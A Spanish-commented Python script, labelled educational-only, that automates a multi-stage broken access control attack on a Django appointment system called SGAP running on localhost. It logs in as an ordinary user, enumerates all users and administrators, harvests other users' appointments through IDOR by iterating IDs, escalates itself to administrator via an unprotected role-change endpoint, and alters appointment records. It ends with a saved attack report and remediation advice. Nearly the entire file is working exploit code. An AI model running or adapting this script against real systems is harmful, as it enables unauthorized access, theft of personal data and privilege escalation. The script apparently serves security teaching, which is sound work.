#!/usr/bin/env python3
"""
Script Avanzado de Explotación - Broken Access Control
=======================================================

Este script demuestra un ataque completo automatizado que explota
múltiples vulnerabilidades de control de acceso en secuencia.

ESCENARIO: Un atacante obtiene acceso completo al sistema SGAP
             partiendo de una cuenta de usuario normal.

⚠️ SOLO PARA USO EDUCATIVO - NO USAR EN SISTEMAS REALES ⚠️
"""

import requests
import json
import time
import sys
from datetime import datetime

class Colors:
    """Colores ANSI para terminal"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class AdvancedAttacker:
    """Clase que simula un atacante avanzado"""
    
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.my_user_id = None
        self.my_username = None
        self.all_users = []
        self.all_citas = []
        self.report = {
            'inicio': datetime.now().isoformat(),
            'vulnerabilidades_explotadas': [],
            'datos_obtenidos': {},
            'acciones_realizadas': []
        }
    
    def log(self, message, color=Colors.BLUE):
        """Imprime mensaje con color"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {message}{Colors.END}")
    
    def log_success(self, message):
        """Log de éxito"""
        self.log(f"✓ {message}", Colors.GREEN)
    
    def log_error(self, message):
        """Log de error"""
        self.log(f"✗ {message}", Colors.RED)
    
    def log_warning(self, message):
        """Log de advertencia"""
        self.log(f"⚠ {message}", Colors.YELLOW)
    
    def log_info(self, message):
        """Log informativo"""
        self.log(f"ℹ {message}", Colors.CYAN)
    
    def print_banner(self):
        """Imprime banner del script"""
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════╗
║                                                                        ║
║               ADVANCED ATTACK SIMULATION                              ║
║               Broken Access Control Exploitation                      ║
║                                                                        ║
║               Target: SGAP System                                     ║
║               Method: Multi-Stage Access Control Bypass               ║
║                                                                        ║
║               ⚠️  FOR EDUCATIONAL PURPOSES ONLY  ⚠️                   ║
║                                                                        ║
╚════════════════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)
    
    def step_1_initial_access(self, username, password):
        """
        FASE 1: Acceso Inicial
        Obtener acceso al sistema con credenciales válidas
        """
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.BLUE}FASE 1: ACCESO INICIAL{Colors.END}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}\n")
        
        self.log_info(f"Intentando acceso con usuario: {username}")
        
        try:
            # Obtener página de login
            response = self.session.get(f"{self.base_url}/")
            
            # Intentar login
            response = self.session.post(
                f"{self.base_url}/",
                data={'username': username, 'password': password},
                allow_redirects=False
            )
            
            if response.status_code in [200, 302]:
                self.log_success(f"Acceso exitoso como: {username}")
                self.my_username = username
                self.report['acciones_realizadas'].append({
                    'fase': 1,
                    'accion': 'login_exitoso',
                    'usuario': username
                })
                return True
            else:
                self.log_error("Fallo en autenticación")
                return False
        except Exception as e:
            self.log_error(f"Error: {str(e)}")
            return False
    
    def step_2_reconnaissance(self):
        """
        FASE 2: Reconocimiento
        Recolectar información sobre el sistema y usuarios
        """
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}FASE 2: RECONOCIMIENTO{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}\n")
        
        self.log_info("Explotando: Exposición de información sensible")
        
        # Obtener lista de todos los usuarios
        try:
            response = self.session.get(f"{self.base_url}/listar_usuarios/")
            
            if response.status_code == 200:
                data = response.json()
                self.all_users = data.get('usuarios', [])
                
                self.log_success(f"Obtenidos {len(self.all_users)} usuarios del sistema")
                
                # Encontrar nuestro ID
                for user in self.all_users:
                    if user['username'] == self.my_username:
                        self.my_user_id = user['id']
                
                # Identificar administradores
                admins = [u for u in self.all_users if u.get('is_staff')]
                self.log_warning(f"Identificados {len(admins)} administradores")
                
                # Guardar en reporte
                self.report['datos_obtenidos']['usuarios'] = len(self.all_users)
                self.report['datos_obtenidos']['administradores'] = len(admins)
                self.report['vulnerabilidades_explotadas'].append({
                    'nombre': 'Exposición de información sensible',
                    'endpoint': '/listar_usuarios/',
                    'severidad': 'Alta'
                })
                
                return True
            else:
                self.log_error("No se pudo obtener lista de usuarios")
                return False
        except Exception as e:
            self.log_error(f"Error: {str(e)}")
            return False
    
    def step_3_data_harvesting(self):
        """
        FASE 3: Recolección de Datos
        Obtener información detallada de otros usuarios
        """
        print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}FASE 3: RECOLECCIÓN DE DATOS{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}{'='*70}{Colors.END}\n")
        
        self.log_info("Explotando: Acceso a datos de otros usuarios")
        
        citas_recolectadas = 0
        
        for user in self.all_users[:5]:  # Limitar a 5 para demo
            user_id = user['id']
            username = user['username']
            
            try:
                # Obtener citas del usuario
                response = self.session.get(
                    f"{self.base_url}/ver_citas_usuario/?user_id={user_id}"
                )
                
                if response.status_code == 200:
                    self.log_success(f"Obtenidas citas de usuario: {username}")
                    citas_recolectadas += 1
                    
                    # Enumerar IDs de citas
                    for cita_id in range(1, 11):
                        try:
                            response = self.session.get(
                                f"{self.base_url}/obtener_datos_cita/{cita_id}/"
                            )
                            if response.status_code == 200:
                                cita_data = response.json()
                                self.all_citas.append(cita_data)
                        except:
                            pass
                
                time.sleep(0.1)  # Evitar sobrecarga
                
            except Exception as e:
                self.log_error(f"Error procesando usuario {username}: {str(e)}")
        
        self.log_success(f"Total de citas obtenidas: {len(self.all_citas)}")
        
        self.report['datos_obtenidos']['citas_robadas'] = len(self.all_citas)
        self.report['vulnerabilidades_explotadas'].append({
            'nombre': 'Acceso a datos de otros usuarios',
            'endpoint': '/ver_citas_usuario/',
            'severidad': 'Alta'
        })
        self.report['vulnerabilidades_explotadas'].append({
            'nombre': 'IDOR - Insecure Direct Object Reference',
            'endpoint': '/obtener_datos_cita/<id>/',
            'severidad': 'Alta'
        })
        
        return True
    
    def step_4_privilege_escalation(self):
        """
        FASE 4: Escalación de Privilegios
        Elevar privilegios a administrador
        """
        print(f"\n{Colors.BOLD}{Colors.RED}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.RED}FASE 4: ESCALACIÓN DE PRIVILEGIOS{Colors.END}")
        print(f"{Colors.BOLD}{Colors.RED}{'='*70}{Colors.END}\n")
        
        self.log_warning("Explotando: Elevación de privilegios")
        
        try:
            # Elevar a administrador
            response = self.session.get(
                f"{self.base_url}/cambiar_rol/",
                params={'user_id': self.my_user_id, 'is_staff': 'true'}
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    self.log_success("¡PRIVILEGIOS ELEVADOS A ADMINISTRADOR!")
                    self.log_warning("Ahora tenemos acceso completo al sistema")
                    
                    self.report['vulnerabilidades_explotadas'].append({
                        'nombre': 'Elevación de privilegios',
                        'endpoint': '/cambiar_rol/',
                        'severidad': 'CRÍTICA'
                    })
                    
                    return True
            
            self.log_error("Fallo en elevación de privilegios")
            return False
            
        except Exception as e:
            self.log_error(f"Error: {str(e)}")
            return False
    
    def step_5_post_exploitation(self):
        """
        FASE 5: Post-Explotación
        Demostrar control total del sistema
        """
        print(f"\n{Colors.BOLD}{Colors.GREEN}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}FASE 5: POST-EXPLOTACIÓN{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}{'='*70}{Colors.END}\n")
        
        self.log_info("Demostrando control total del sistema...")
        
        # Capacidades demostradas
        capabilities = [
            "✓ Modificar estado de cualquier cita",
            "✓ Eliminar cualquier cita del sistema",
            "✓ Crear citas en nombre de otros usuarios",
            "✓ Modificar roles de otros usuarios",
            "✓ Acceder a toda la información confidencial",
            "✓ Manipular el flujo de trabajo completo",
        ]
        
        for capability in capabilities:
            time.sleep(0.3)
            print(f"{Colors.GREEN}{capability}{Colors.END}")
        
        # Ejemplo: Modificar estado de una cita
        if self.all_citas:
            cita_id = self.all_citas[0]['id']
            
            try:
                response = self.session.post(
                    f"{self.base_url}/modificar_estado_cita/{cita_id}/",
                    data={'estado': 'Confirmada'}
                )
                
                if response.status_code == 200:
                    self.log_success(f"Cita {cita_id} modificada exitosamente")
                    
                    self.report['vulnerabilidades_explotadas'].append({
                        'nombre': 'Modificación de estado sin permisos',
                        'endpoint': '/modificar_estado_cita/<id>/',
                        'severidad': 'Media-Alta'
                    })
            except:
                pass
        
        return True
    
    def generate_report(self):
        """
        Genera reporte final del ataque
        """
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.BLUE}REPORTE FINAL DEL ATAQUE{Colors.END}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.END}\n")
        
        self.report['fin'] = datetime.now().isoformat()
        
        print(f"{Colors.BOLD}Resumen de Explotación:{Colors.END}\n")
        
        print(f"Usuario inicial: {Colors.CYAN}{self.my_username}{Colors.END}")
        print(f"Privilegios obtenidos: {Colors.RED}ADMINISTRADOR{Colors.END}\n")
        
        print(f"{Colors.BOLD}Datos Comprometidos:{Colors.END}")
        print(f"  • Usuarios enumerados: {self.report['datos_obtenidos'].get('usuarios', 0)}")
        print(f"  • Citas accedidas: {self.report['datos_obtenidos'].get('citas_robadas', 0)}")
        print(f"  • Administradores identificados: {self.report['datos_obtenidos'].get('administradores', 0)}\n")
        
        print(f"{Colors.BOLD}Vulnerabilidades Explotadas:{Colors.END}")
        for i, vuln in enumerate(self.report['vulnerabilidades_explotadas'], 1):
            severidad_color = Colors.RED if vuln['severidad'] == 'CRÍTICA' else Colors.YELLOW
            print(f"  {i}. {vuln['nombre']}")
            print(f"     Endpoint: {vuln['endpoint']}")
            print(f"     Severidad: {severidad_color}{vuln['severidad']}{Colors.END}\n")
        
        print(f"{Colors.BOLD}Impacto del Ataque:{Colors.END}")
        impactos = [
            f"{Colors.RED}✗ Compromiso total del sistema",
            f"{Colors.RED}✗ Acceso a información confidencial de todos los usuarios",
            f"{Colors.RED}✗ Capacidad de modificar/eliminar cualquier dato",
            f"{Colors.RED}✗ Control total sobre flujos de trabajo",
            f"{Colors.RED}✗ Posibilidad de crear puertas traseras",
        ]
        
        for impacto in impactos:
            print(f"  {impacto}{Colors.END}")
        
        # Guardar reporte en archivo
        report_filename = f"attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.report, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Colors.GREEN}Reporte guardado en: {report_filename}{Colors.END}")
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}CONCLUSIÓN{Colors.END}")
        print(f"{Colors.BOLD}{Colors.YELLOW}{'='*70}{Colors.END}\n")
        
        print(f"{Colors.RED}Este ataque demuestra cómo un usuario normal puede obtener")
        print(f"control COMPLETO del sistema explotando vulnerabilidades de")
        print(f"control de acceso.{Colors.END}\n")
        
        print(f"{Colors.YELLOW}Recomendaciones:{Colors.END}")
        print(f"  1. Implementar verificación de permisos en TODOS los endpoints")
        print(f"  2. Usar decoradores de Django para control de acceso")
        print(f"  3. Validar propiedad de recursos antes de permitir acceso")
        print(f"  4. Implementar logging de acciones sensibles")
        print(f"  5. Realizar auditorías de seguridad periódicas")
        print(f"  6. Aplicar principio de privilegio mínimo")
        print(f"  7. Implementar rate limiting en endpoints críticos\n")

def main():
    """Función principal"""
    
    # Configuración
    BASE_URL = "http://localhost:8000"
    USERNAME = input(f"{Colors.CYAN}Ingresa el nombre de usuario: {Colors.END}") or "usuario"
    PASSWORD = input(f"{Colors.CYAN}Ingresa la contraseña: {Colors.END}") or "password123"
    
    # Crear atacante
    attacker = AdvancedAttacker(BASE_URL)
    attacker.print_banner()
    
    print(f"\n{Colors.YELLOW}Este script simula un ataque completo al sistema SGAP{Colors.END}")
    print(f"{Colors.YELLOW}explotando múltiples vulnerabilidades de control de acceso.{Colors.END}\n")
    
    input(f"{Colors.CYAN}Presiona ENTER para comenzar el ataque...{Colors.END}")
    
    try:
        # FASE 1: Acceso inicial
        if not attacker.step_1_initial_access(USERNAME, PASSWORD):
            print(f"\n{Colors.RED}Ataque fallido: No se pudo obtener acceso inicial{Colors.END}")
            return
        
        time.sleep(1)
        
        # FASE 2: Reconocimiento
        if not attacker.step_2_reconnaissance():
            print(f"\n{Colors.YELLOW}Advertencia: Falló reconocimiento, continuando...{Colors.END}")
        
        time.sleep(1)
        
        # FASE 3: Recolección de datos
        attacker.step_3_data_harvesting()
        time.sleep(1)
        
        # FASE 4: Escalación de privilegios
        if attacker.step_4_privilege_escalation():
            time.sleep(1)
            
            # FASE 5: Post-explotación
            attacker.step_5_post_exploitation()
        
        # Generar reporte
        time.sleep(1)
        attacker.generate_report()
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Ataque interrumpido por el usuario{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}Error durante el ataque: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()
